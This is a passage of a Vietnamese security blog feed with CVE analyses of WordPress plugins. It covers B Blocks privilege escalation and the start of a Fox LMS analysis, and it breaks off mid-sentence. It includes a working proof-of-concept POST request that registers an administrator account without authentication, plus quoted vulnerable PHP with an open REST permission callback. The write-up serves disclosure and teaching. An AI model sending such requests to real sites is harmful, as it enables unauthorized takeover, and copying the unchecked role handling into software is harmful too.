Việc này chặn trực tiếp khả năng gọi hàm &lt;strong&gt;&lt;code&gt;rgfr_registration()&lt;/code&gt;&lt;/strong&gt; từ bên ngoài, qua đó loại bỏ vector tấn công cho phép tạo tài khoản trái phép và tự gán quyền quản trị.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/patch.png&#39; alt=&#34;Patch&#34; height=&#34;501&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access a post/page containing the Countdown block&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract nonce from HTML response or DevTools → Network&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Prepare POST request to /wp-admin/admin-ajax.php?action=rgfr_registration&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attach extracted nonce and registration parameters&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Set role=administrator in request payload&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Request reaches wp_ajax_nopriv_rgfr_registration action hook&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;rgfr_registration() verifies nonce only (no authorization check)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User input is accepted without role validation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;wp_create_user() creates a new user account&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;wp_update_user() assigns attacker-controlled role&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New user account is created with Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy cập vào post/page có chứa block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt; và trích xuất &lt;strong&gt;nonce&lt;/strong&gt; từ response trả về (View Source hoặc DevTools → Network).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Gửi request tới endpoint &lt;strong&gt;&lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt;&lt;/strong&gt; với action &lt;strong&gt;&lt;code&gt;rgfr_registration&lt;/code&gt;&lt;/strong&gt;, kèm theo nonce vừa lấy được và thiết lập tham số &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt; để tạo tài khoản với quyền quản trị.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=rgfr_registration&amp;amp;nonce=nonce_value&amp;amp;username=hacker&amp;amp;email=hacker@gmail.com&amp;amp;password=hacker&amp;amp;confirmpassword=hacker&amp;amp;firstname=hacker&amp;amp;role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/result.png&#39; alt=&#34;Result&#34; height=&#34;772&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login với user vừa tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong plugin &lt;strong&gt;B Blocks&lt;/strong&gt; phiên bản &lt;strong&gt;2.0.6&lt;/strong&gt; xuất phát từ việc endpoint AJAX &lt;strong&gt;&lt;code&gt;rgfr_registration&lt;/code&gt;&lt;/strong&gt; được public cho người dùng chưa đăng nhập, trong khi phía server &lt;strong&gt;chỉ kiểm tra nonce mà không thực hiện kiểm soát phân quyền (authorization)&lt;/strong&gt; và &lt;strong&gt;không ràng buộc giá trị role đầu vào (input validation)&lt;/strong&gt;. Nonce có thể được thu thập dễ dàng thông qua block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;, cho phép kẻ tấn công gửi request tùy ý và tự gán &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt; khi đăng ký tài khoản mới. Kết quả là attacker có thể tạo tài khoản với &lt;strong&gt;quyền quản trị viên&lt;/strong&gt;, dẫn đến &lt;strong&gt;nâng cao đặc quyền toàn hệ thống&lt;/strong&gt;, gây rủi ro nghiêm trọng cho tính toàn vẹn và bảo mật của website.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce không phải là cơ chế phân quyền&lt;/strong&gt;: Nonce chỉ giúp chống CSRF, không thể thay thế cho việc kiểm tra quyền truy cập hoặc xác thực người dùng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không bao giờ tin tưởng dữ liệu từ client&lt;/strong&gt;: Các tham số nhạy cảm như &lt;strong&gt;role&lt;/strong&gt;, &lt;strong&gt;capability&lt;/strong&gt; phải được kiểm soát phía server hoặc whitelist chặt chẽ.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Endpoint public cần kiểm soát rủi ro nghiêm ngặt&lt;/strong&gt;: Các hook dạng &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;&lt;/strong&gt; phải được thiết kế cẩn thận vì có thể bị truy cập bởi bất kỳ ai.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Validate và sanitize là hai khái niệm khác nhau&lt;/strong&gt;: Sanitize chỉ làm sạch dữ liệu, không đảm bảo dữ liệu hợp lệ về mặt logic và bảo mật.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/b-blocks/vulnerability/wordpress-b-blocks-plugin-2-0-6-missing-authorization-to-unauthenticated-privilege-escalation-via-rgfr-registration-function-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress B Blocks Plugin 2.0.6 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/</link>
      <pubDate>Thu, 08 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The Fox LMS – WordPress LMS Plugin&lt;/strong&gt; dành cho &lt;strong&gt;WordPress&lt;/strong&gt; tồn tại lỗ hổng &lt;strong&gt;leo thang đặc quyền&lt;/strong&gt; trong tất cả các &lt;strong&gt;phiên bản đến và bao gồm 1.0.5.1&lt;/strong&gt;. Nguyên nhân là do plugin &lt;strong&gt;không kiểm tra và xác thực đúng tham số “role”&lt;/strong&gt; khi &lt;strong&gt;tạo người dùng mới&lt;/strong&gt; thông qua &lt;strong&gt;REST API endpoint &lt;code&gt;/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công không cần xác thực&lt;/strong&gt; có thể &lt;strong&gt;tạo tài khoản người dùng mới với bất kỳ vai trò nào, bao gồm cả quản trị viên&lt;/strong&gt;, dẫn đến &lt;strong&gt;toàn bộ website có thể bị chiếm quyền kiểm soát&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 1.0.4.7-1.0.5.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.0.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fox-lms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Fox LMS&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.0.5.3&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Mặc dù thông tin công bố cho biết lỗ hổng đã được vá trong phiên bản &lt;strong&gt;&lt;code&gt;1.0.5.2&lt;/code&gt;&lt;/strong&gt;, nhưng trên thực tế bản vá chỉ được áp dụng đầy đủ từ phiên bản &lt;strong&gt;&lt;code&gt;1.0.5.3&lt;/code&gt;&lt;/strong&gt;.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một REST API như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    self::getNamespace(), // fox-lms/v1&#xA;    $this-&amp;gt;getRoute(&amp;#39;create-order&amp;#39;), // payments/create-order&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; WP_REST_Server::CREATABLE, // POST&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;createOrder&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; &amp;#39;__return_true&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Với cấu hình này, endpoint được public tại địa chỉ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-json/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi có một request gửi đến endpoint trên bằng phương thức POST, WordPress sẽ tự động gọi hàm &lt;code&gt;createOrder()&lt;/code&gt;. Do thiết lập &lt;code&gt;&#39;permission_callback&#39; =&amp;gt; &#39;__return_true&#39;&lt;/code&gt;, nên endpoint này không yêu cầu kiểm tra quyền truy cập. Điều đó đồng nghĩa với việc &lt;strong&gt;bất kỳ người dùng nào, kể cả người chưa đăng nhập, đều có thể truy cập và thực thi API này mà không gặp bất kỳ rào cản phân quyền nào&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function createOrder(WP_REST_Request $request): WP_REST_Response&#xA;{&#xA;    $defaults = [&#xA;        &amp;#39;courseId&amp;#39;   =&amp;gt; 0,&#xA;        &amp;#39;role&amp;#39;       =&amp;gt; &amp;#39;subscriber&amp;#39;,&#xA;        ...&#xA;    ];&#xA;    ...&#xA;    $params = wp_parse_args($request-&amp;gt;get_params(), $defaults);&#xA;&#xA;    if (absint($params[&amp;#39;courseId&amp;#39;]) &amp;lt;= 0) {&#xA;        return (new Response() )-&amp;gt;respond(&#xA;            [&#xA;                &amp;#39;message&amp;#39; =&amp;gt; Fox_Lms_Checkout_Public::getPaymentError(&#xA;                    $this-&amp;gt;errorTitle,&#xA;                    __(&amp;#39;Course not found&amp;#39;, &amp;#39;fox-lms&amp;#39;)&#xA;                ),&#xA;            ],&#xA;            404&#xA;        );&#xA;    }&#xA;    $username = sanitize_user($params[&amp;#39;username&amp;#39;]);&#xA;    $email    = sanitize_email($params[&amp;#39;email&amp;#39;]);&#xA;    ...&#xA;    try {&#xA;        $currency = Payment::instance()-&amp;gt;getCurrencyCode();&#xA;&#xA;        $course         = get_post($params[&amp;#39;courseId&amp;#39;]);&#xA;        $course_info = Fox_Lms_Data::get_course_by_post_id( $params[&amp;#39;courseId&amp;#39;]);&#xA;            &#xA;        $settings = Fox_Lms_Data::get_course_validated_data_from_array( $course_info,[]);&#xA;        $price = Fox_Lms_Data::fox_lms_get_course_price($settings);&#xA;    &#xA;        $courseSettings = [&#xA;            &amp;#39;priceType&amp;#39;  =&amp;gt; ! empty($settings[&amp;#39;fox_lms_payment_type&amp;#39;]) ? $settings[&amp;#39;fox_lms_payment_type&amp;#39;] : &amp;#39;free&amp;#39;,&#xA;            &amp;#39;price&amp;#39; =&amp;gt; $price,&#xA;        ];&#xA;        // $courseSettings = SettingsManager::get($course-&amp;gt;ID);&#xA;        $price          = floatval($courseSettings[&amp;#39;price&amp;#39;]);&#xA;        ...&#xA;&#xA;        // If price is zero or less, treat as free order: create completed order and enroll user immediately.&#xA;        if ($price &amp;lt;= 0) {&#xA;            global $wpdb;&#xA;&#xA;            $userId = 0;&#xA;            if (is_user_logged_in()) {&#xA;                $userId = get_current_user_id();&#xA;            } else {&#xA;                $userData = array(&#xA;                    &amp;#39;first_name&amp;#39; =&amp;gt; sanitize_text_field($params[&amp;#39;first_name&amp;#39;]),&#xA;                    &amp;#39;last_name&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;last_name&amp;#39;]),&#xA;                    &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user($params[&amp;#39;username&amp;#39;]),&#xA;                    &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email($params[&amp;#39;email&amp;#39;]),&#xA;                    &amp;#39;user_pass&amp;#39;  =&amp;gt; sanitize_text_field($params[&amp;#39;password&amp;#39;]),&#xA;                    &amp;#39;role&amp;#39;       =&amp;gt; sanitize_text_field($params[&amp;#39;role&amp;#39;]),&#xA;                );&#xA;&#xA;                $userId = wp_insert_user($userData);&#xA;                ...&#xA;            }&#xA;        }&#xA;        ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;createOrder()&lt;/code&gt; nhận dữ liệu từ request và gán giá trị mặc định, trong đó &lt;strong&gt;&lt;code&gt;role&lt;/code&gt; mặc định là &lt;code&gt;subscriber&lt;/code&gt;&lt;/strong&gt;. Tuy nhiên, toàn bộ tham số từ phía người dùng gửi lên được trộn trực tiếp vào &lt;code&gt;$params&lt;/code&gt; thông qua &lt;code&gt;wp_parse_args()&lt;/code&gt; mà &lt;strong&gt;không có bước kiểm tra hay giới hạn giá trị hợp lệ cho &lt;code&gt;role&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi khóa học có giá &lt;strong&gt;bằng 0 hoặc miễn phí&lt;/strong&gt;, hệ thống sẽ tự động tạo tài khoản người dùng mới nếu người gọi API chưa đăng nhập. Dữ liệu người dùng 